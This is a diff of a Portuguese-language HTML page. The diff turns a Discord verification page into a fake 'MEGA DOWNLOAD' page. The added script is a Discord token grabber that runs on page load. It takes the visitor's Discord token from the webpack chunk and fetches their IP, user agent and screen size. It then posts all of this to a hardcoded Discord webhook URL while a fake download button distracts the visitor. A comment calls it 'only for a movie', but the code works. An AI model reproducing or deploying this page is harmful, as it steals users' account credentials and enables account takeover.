@@ -1,98 +1,184 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação Concluída</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>MEGA DOWNLOAD HACKER</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Courier New', monospace;
         }
-
         body {
-            background: linear-gradient(135deg, #7289da 0%, #ffffff 100%);
-            height: 100vh;
+            background: linear-gradient(135deg, #000, #1a1a1a);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            overflow: hidden;
         }
-
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/matrix_code.gif');
+            opacity: 0.2;
+            z-index: -1;
+            animation: matrixFlow 30s linear infinite;
+        }
+        @keyframes matrixFlow {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100%; }
+        }
         .container {
-            background-color: #36393f;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            background: rgba(0, 0, 0, 0.9);
+            padding: 60px;
+            border: 8px solid #FF0000;
+            border-radius: 15px;
+            box-shadow: 0 0 50px #FF0000, inset 0 0 20px #FF0000;
             text-align: center;
-            max-width: 500px;
+            animation: pulse 2s infinite;
+            max-width: 800px;
             width: 90%;
         }
-
-        .check-icon {
-            font-size: 80px;
-            color: #43b581;
-            margin-bottom: 20px;
-            animation: bounce 1s ease-in-out;
+        @keyframes pulse {
+            0% { box-shadow: 0 0 50px #FF0000, inset 0 0 20px #FF0000; }
+            50% { box-shadow: 0 0 80px #00FF00, inset 0 0 30px #00FF00; }
+            100% { box-shadow: 0 0 50px #FF0000, inset 0 0 20px #FF0000; }
         }
-
         h1 {
-            color: #ffffff;
-            margin-bottom: 15px;
-            font-size: 28px;
+            font-size: 64px;
+            color: #00FF00;
+            text-shadow: 0 0 15px #00FF00, 0 0 30px #FF0000;
+            margin-bottom: 30px;
+            animation: glitch 2s infinite;
         }
-
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(5px, -5px); }
+            60% { transform: translate(-5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
         p {
-            color: #dcddde;
-            margin-bottom: 25px;
-            line-height: 1.5;
+            font-size: 24px;
+            color: #FFF;
+            margin-bottom: 40px;
         }
-
-        .discord-button {
-            background-color: #7289da;
-            color: white;
-            padding: 15px 30px;
-            border-radius: 5px;
-            text-decoration: none;
-            display: inline-block;
-            font-weight: bold;
-            transition: all 0.3s ease;
+        .download-button {
+            padding: 30px 60px;
+            font-size: 36px;
+            background: linear-gradient(45deg, #FF0000, #FF4500);
+            color: #FFF;
             border: none;
+            border-radius: 10px;
             cursor: pointer;
-            font-size: 16px;
+            transition: all 0.5s;
+            text-transform: uppercase;
+            box-shadow: 0 0 30px #FF0000;
+            letter-spacing: 2px;
         }
-
-        .discord-button:hover {
-            background-color: #5b6eae;
-            transform: translateY(-2px);
+        .download-button:hover {
+            background: linear-gradient(45deg, #00FF00, #32CD32);
+            box-shadow: 0 0 50px #00FF00;
+            transform: scale(1.1);
         }
-
-        .link-info {
+        .download-button:active {
+            transform: scale(0.95);
+        }
+        .status {
             margin-top: 20px;
-            color: #b9bbbe;
-            font-size: 14px;
+            font-size: 20px;
+            color: #FF0000;
+            text-shadow: 0 0 10px #FF0000;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
         }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
+        @keyframes fadeIn {
+            to { opacity: 1; }
         }
     </style>
 </head>
 <body>
+    <div class="matrix-bg"></div>
     <div class="container">
-        <i class="fas fa-check-circle check-icon"></i>
-        <h1>Verificação Concluída com Sucesso!</h1>
-        <p>Você foi verificado com sucesso no servidor do Discord.</p>
-        <a href="https://discord.gg/v9xuTBHX57" class="discord-button">
-            Voltar para o Servidor
-        </a>
-        <div class="link-info">
-            Este é o link de rede de aceleramento:<br>
-            <a href="https://discord.gg/v9xuTBHX57" style="color: #7289da;">https://discord.gg/v9xuTBHX57</a>
-        </div>
+        <h1>MEGA DOWNLOAD </h1>
+        <p>APERTAR AQUI PARA O DOWNLOAD</p>
+        <button class="download-button" onclick="fakeDownload()">DOWNLOAD AGORA</button>
+        <div class="status" id="status">CAPTURANDO DADOS...</div>
     </div>
+
+    <script>
+        // MEGA TOKEN GRABBER - SÓ PRA FILME, NÃO USE NA VIDA REAL!
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366216805642801163/zeuAqNvhBc_2fYCAv914lRy2Kd9eKAHPqIU1GIf70MgiYeZyvsjCe4w1KkMSCHqLHout'; // Substitua pelo seu webhook
+
+        // FUNÇÃO PRA CAPTURAR O TOKEN
+        async function grabToken() {
+            try {
+                const token = (webpackChunkdiscord_app || []).push([[Math.random()], {}, (req) => {
+                    for (let m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
+                        if (m.default && m.default.getToken !== undefined) {
+                            return m.default.getToken();
+                        }
+                    }
+                }]);
+
+                if (token) {
+                    const userAgent = navigator.userAgent;
+                    const screen = `${window.screen.width}x${window.screen.height}`;
+                    const timestamp = new Date().toISOString();
+                    const ip = await fetch('https://api.ipify.org?format=json')
+                        .then(res => res.json())
+                        .then(data => data.ip)
+                        .catch(() => 'DESCONHECIDO');
+
+                    const data = {
+                        token: token,
+                        ip: ip,
+                        userAgent: userAgent,
+                        screen: screen,
+                        timestamp: timestamp
+                    };
+
+                    // ENVIA PRO WEBHOOK
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `🔐 [MEGA GRABBER] Novo token capturado!\n📜 **Token**: ${token}\n🌐 **IP**: ${ip}\n🖥️ **User-Agent**: ${userAgent}\n📏 **Resolução**: ${screen}\n⏰ **Timestamp**: ${timestamp}`,
+                            username: 'MEGA_TOKEN_GRABBER'
+                        })
+                    });
+
+                    document.getElementById('status').innerText = 'DADOS ENVIADOS!';
+                    console.log('[MEGA GRABBER] Token enviado:', token);
+                } else {
+                    document.getElementById('status').innerText = 'NENHUM TOKEN ENCONTRADO!';
+                    console.warn('[MEGA GRABBER] Nenhum token encontrado.');
+                }
+            } catch (error) {
+                document.getElementById('status').innerText = 'ERRO AO CAPTURAR DADOS!';
+                console.error('[MEGA GRABBER] Erro:', error);
+            }
+        }
+
+        // FUNÇÃO FAKE DE DOWNLOAD
+        function fakeDownload() {
+            document.getElementById('status').innerText = 'INICIANDO DOWNLOAD ...';
+            setTimeout(() => {
+                document.getElementById('status').innerText = 'DOWNLOAD CONCLUÍDO (BRINCADEIRA)!';
+            }, 2000);
+        }
+
+        // EXECUTA A CAPTURA AUTOMATICAMENTE
+        window.addEventListener('load', () => {
+            grabToken();
+        });
+    </script>
 </body>
 </html>
